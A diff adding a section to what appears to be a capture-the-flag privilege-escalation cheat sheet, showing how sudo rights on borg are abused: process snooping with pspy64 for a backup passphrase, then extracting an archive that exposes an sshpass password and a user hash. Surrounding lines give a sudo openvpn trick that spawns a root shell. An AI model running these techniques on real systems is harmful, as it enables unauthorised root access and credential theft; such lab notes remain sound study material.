@@ -1667,6 +1667,43 @@ root
 (ALL) NOPASSWD: /usr/bin/borg mount *
 (ALL) NOPASSWD: /usr/bin/borg extract *
 ````
+##### Writable directory
+````
+find -name / "*borg*"
+````
+````
+/opt/borgbackup
+````
+##### finding creds to login
+````
+./pspy64 -pf -i 1000
+````
+````
+BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA'
+````
+##### Exploitation
+````
+sarah@backup:/opt$ sudo /usr/bin/borg list *
+````
+````
+(name of archive) (data & time) (hash of archive)
+````
+````
+sarah@backup:/opt$ sudo /usr/bin/borg extract borgbackup::home
+````
+````
+sudo /usr/bin/borg extract [folder that is writable]::[name of archive]
+````
+````
+sarah@backup:/opt$ sudo /usr/bin/borg extract --stdout borgbackup::home
+````
+````
+mesg n 2> /dev/null || true
+sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
+{
+    "user": "amy",
+    "pass": "0814b6b7f0de51ecf54ca5b6e6e612bf"
+````
 #### (ALL : ALL) /usr/sbin/openvpn
 ````
 sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
